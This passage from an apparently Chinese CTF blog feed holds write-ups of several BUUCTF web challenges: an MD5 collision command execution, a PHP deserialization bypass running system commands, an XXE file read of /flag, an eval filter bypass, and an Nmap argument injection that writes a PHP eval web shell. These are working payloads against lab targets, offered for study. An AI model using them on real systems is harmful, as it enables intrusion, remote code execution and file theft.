class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:<span class="title function_ invoke__">url</span>(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>主要考察md5强碰撞</p><p><a href="https://blog.51cto.com/u_14601424/6258344">浅谈md5弱类型比较和强碰撞</a></p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?cmd=sort%20/flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>e731dded-fc69-4975-9a54-828c91d5138d.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>307</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://e731dded-fc69-4975-9a54-828c91d5138d.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://e731dded-fc69-4975-9a54-828c91d5138d.node5.buuoj.cn:81/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=l\s</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">a<span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%00</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1U</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span>&amp;b<span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%02</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1</span><span class="variable">%D5</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span></span></span><br></pre></td></tr></table></figure><p>得到flag:</p><p>sort &#x2F;flag<br>flag{aeaa3aba-1fc0-49bf-83bb-bb67d58acb5a}</p><p>这里没有过滤sort,当然,也可以使用<code>\</code>来绕过对命令的过滤,如<code>ca\t /flag</code></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php md5强碰撞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 2020 朱雀组 phpweb</title>
      <link href="/2024/01/14/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/"/>
      <url>/2024/01/14/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/</url>
      
        <content type="html"><![CDATA[<h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>aaaa</p><p>进去之后有一个date()的报错,然后不断刷新</p><p>容易发现这个date函数是由传入的func的值确认的</p><p>但是将func改为其他函数如system等则会回显Hacker</p><p>尝试读取源码</p><p>post传参: func&#x3D;highlight_file&amp;p&#x3D;index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;phpweb&lt;/title&gt;</span><br><span class="line">    &lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            background: <span class="title function_ invoke__">url</span>(<span class="string">&quot;bg.jpg&quot;</span>) no-repeat;</span><br><span class="line">            background-size: <span class="number">100</span>%;</span><br><span class="line">        &#125;</span><br><span class="line">        p &#123;</span><br><span class="line">            color: white;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script language=javascript&gt;</span><br><span class="line">    <span class="title function_ invoke__">setTimeout</span>(<span class="string">&quot;document.form1.submit()&quot;</span>,<span class="number">5000</span>)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;form  id=form1 name=form1 action=<span class="string">&quot;index.php&quot;</span> method=post&gt;</span><br><span class="line">    &lt;input type=hidden id=func name=func value=<span class="string">&#x27;date&#x27;</span>&gt;</span><br><span class="line">    &lt;input type=hidden id=p name=p value=<span class="string">&#x27;Y-m-d h:i:s a&#x27;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一想到的就是反序列化了</p><p>这里并没有过滤serialize()函数,就可以造成反序列化,从而绕过disable_fun的检查</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line">    <span class="variable">$nacl</span>-&gt;func = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="variable">$nacl</span>-&gt;p = <span class="string">&#x27;cat /tmp/flagoefiu4r93&#x27;</span>;</span><br><span class="line">    <span class="comment">//find / -name *flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查找flag:</p><p>func&#x3D;unserialize&amp;p&#x3D;O:4:”Test”:2:{s:1:”p”;s:19:”find &#x2F; -name <em>flag</em>“;s:4:”func”;s:6:”system”;}</p><p>最终payload:</p><p>func&#x3D;unserialize&amp;p&#x3D;O:4:”Test”:2:{s:1:”p”;s:22:”cat &#x2F;tmp&#x2F;flagoefiu4r93”;s:4:”func”;s:6:”system”;}</p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;</span><br><span class="line">    flag&#123;92146d45-0e57-40cc-a59b-8fd5c52bc35d&#125;</span><br><span class="line">flag&#123;92146d45-0e57-40cc-a59b-8fd5c52bc35d&#125;&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>还有一种方法是用<code>\system</code>绕过inarry的过滤</p><p>payload:</p><p>func&#x3D;\system&amp;p&#x3D;cat &#x2F;tmp&#x2F;flagoefiu4r93</p>]]></content>
      
      
      <categories>
          
          <category> buu刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一道题目中了解XXE漏洞</title>
      <link href="/2024/01/13/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E4%B8%AD%E4%BA%86%E8%A7%A3XXE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/01/13/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E4%B8%AD%E4%BA%86%E8%A7%A3XXE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>关于XXE漏洞参考:</p><p><a href="https://xz.aliyun.com/t/6887?time__1311=n4+xnD0DRDyB5AKDsYohhG5it0=7KqYqx">从XML相关一步一步到XXE漏洞</a></p><p>可以看见,这里回显了<code>&lt;uesrname&gt;&lt;/username&gt;</code>标签中的内容</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240114165435806.png" alt="image-20240114165435806"></p><p>故而构造payload,将这个位置输出改为任意文件读取</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/doLogin.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>76b8b4e7-f8b0-4c91-a92c-caaf7c02d684.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/xml, text/xml, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml;charset=utf-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>166</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://76b8b4e7-f8b0-4c91-a92c-caaf7c02d684.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://76b8b4e7-f8b0-4c91-a92c-caaf7c02d684.node5.buuoj.cn:81/</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">nacl</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>nacl<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>得到flag:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 14 Jan 2024 08:52:55 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>85</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.4.0RC6</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="section">&lt;result&gt;</span><span class="section">&lt;code&gt;</span><span class="attribute">0</span>&lt;/code&gt;&lt;msg&gt;flag&#123;f6f20d58-f890-<span class="number">498</span>d-<span class="number">9938</span>-<span class="number">465594</span>f59376&#125;</span></span><br><span class="line"><span class="language-apache"><span class="section">&lt;/msg&gt;</span><span class="section">&lt;/result&gt;</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> XXE漏洞(XML外部实体注入) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE漏洞(XML外部实体注入) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一个题目中了解http请求走私</title>
      <link href="/2024/01/13/%E4%BB%8E%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E4%B8%AD%E4%BA%86%E8%A7%A3http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
      <url>/2024/01/13/%E4%BB%8E%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E4%B8%AD%E4%BA%86%E8%A7%A3http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
      
        <content type="html"><![CDATA[<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="RoarCTF 2019]Easy Calc"></a>RoarCTF 2019]Easy Calc</h1><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>之前做过这道题,但是是使用php字符串解析来绕过</p><p>关于php字符串解析特性:</p><p><a href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性Bypass</a></p><p>并且还做了一些过滤黑字符,比如<code>/</code>和反引号等等</p><p>源码&#x2F;calc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>不过还是可以绕过</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/calc.php?%20num=var_dump(scandir(chr(47)))</span><br><span class="line">/calc.php?%20num=file_get_contents(chr(47).f1agg) </span><br></pre></td></tr></table></figure><p>chr将ascii码转换为字符</p><h3 id="方法二-http请求走私"><a href="#方法二-http请求走私" class="headerlink" title="方法二:http请求走私"></a>方法二:http请求走私</h3><p>这篇文章写的非常详细:</p><p><a href="https://xz.aliyun.com/t/6654?time__1311=n4+xnD0DRDBGitGk7rDsA3o+DcC+CN3DuiAYD">从一道题到协议层攻击之HTTP请求走私</a></p><p>使用CL-CL的方式使得前端服务器</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240113201605455.png" alt="image-20240113201605455"></p><p>按照<strong>RFC7230规范</strong>,此时应该返回400错误,前端服务器也确实做了,但是仍然将请求转发给了后端,使得前端服务器的waf被绕过</p>]]></content>
      
      
      <categories>
          
          <category> buu刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http请求走私 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 2020 朱雀组 Nmap</title>
      <link href="/2024/01/09/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/"/>
      <url>/2024/01/09/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/</url>
      
        <content type="html"><![CDATA[<h1 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h1><p>一个在线nmap工具,第一反应应该是<code>;</code> <code>||</code> <code>&amp;&amp;</code>拼接其他命令</p><p>无果.</p><p>那么就可以猜测nmap是否有一些特殊的参数可以利用了</p><p>查询nmap中文文档,发现有可以输出内容到文件的参数:<a href="https://nmap.org/man/zh/man-output.html">https://nmap.org/man/zh/man-output.html</a></p><p>可以手动测试一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240112200133393.png" alt="image-20240112200133393"></p><p>这会把一个php一句话木马保存到文件中,并且后缀名是可以被我们自定义为.php的</p><p>但是这里是加了waf的,不过很容易能够测试出来是过滤了’php’</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240112200505004.png" alt="image-20240112200505004"></p><p>这里使用php短标签绕过就行</p><p>payload: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= @eval($_POST[nacl]);?&gt;&#x27; -oG shell.phtml &#x27;</span><br></pre></td></tr></table></figure><p>直接在网站根目录就能访问到木马</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240112210140474.png" alt="image-20240112210140474"></p><p>但是这里的敏感字符被转译了,百般搜索后发现是采用了<a 